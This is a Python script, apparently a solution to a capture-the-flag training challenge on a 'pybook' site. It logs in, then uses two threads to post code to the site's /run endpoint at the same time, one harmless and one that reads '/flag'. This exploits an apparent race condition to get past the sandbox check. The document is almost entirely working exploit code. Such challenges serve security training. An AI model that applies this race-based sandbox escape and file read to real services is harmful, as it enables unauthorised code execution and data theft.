import requests
import threading
import random
import string
import time

baseurl="http://pybook.training.jinblack.it"

def randomString():
    return ''.join(random.sample(string.ascii_letters + string.digits, 10))
        
def login(session,username,password):
    url="%s/login" % baseurl
    data={"username": username, "password": password}
    try:
        r = session.post(url, data=data)
        r.raise_for_status()  # Solleva un'eccezione in caso di errore HTTP
        print("Richiesta inviata con successo!")
        print("Risposta del server:", r.text)
    except requests.exceptions.RequestException as e:
        print(f"Errore durante l'invio della richiesta: {e}")

def registration(session, username, password):
    url="%s/register" % baseurl
    data={"username": username, "password": password}
    try:
        r = session.post(url, data=data)
        r.raise_for_status()  # Solleva un'eccezione in caso di errore HTTP
        print("Richiesta inviata con successo!")
        print("Risposta del server:", r.text)
    except requests.exceptions.RequestException as e:
        print(f"Errore durante l'invio della richiesta: {e}")

def file(session, code):
    url = "%s/run" % baseurl
    try:
        r = session.post(url, data=code)
        r.raise_for_status()  # Solleva un'eccezione in caso di errore HTTP
        print("Richiesta inviata con successo!")
        if "flag" in r.text:
            print(r.text)
      
    except requests.exceptions.RequestException as e:
        print(f"Errore durante l'invio della richiesta: {e}")



def readcode():
    url = "http://pybook.training.jinblack.it/flag"
    try:
        response = requests.get(url)
        response.raise_for_status()  # Solleva un'eccezione se c'è un problema con la richiesta HTTP

    # Stampa il contenuto della risorsa
        print(response.text)
    except requests.exceptions.RequestException as e:
        print(f"Errore durante la richiesta HTTP: {e}")


s = requests.Session() #  to create session
u="x"
p="x"
c="""
print(open("/flag").read())
"""
d="""
x=0
"""

login(s,u,p)
print(s.headers)
print(s)
t1=threading.Thread(target=file, args=(s,d))
t2=threading.Thread(target=file, args=(s,c))


t1.start()
t2.start()

t1.join()
t2.join()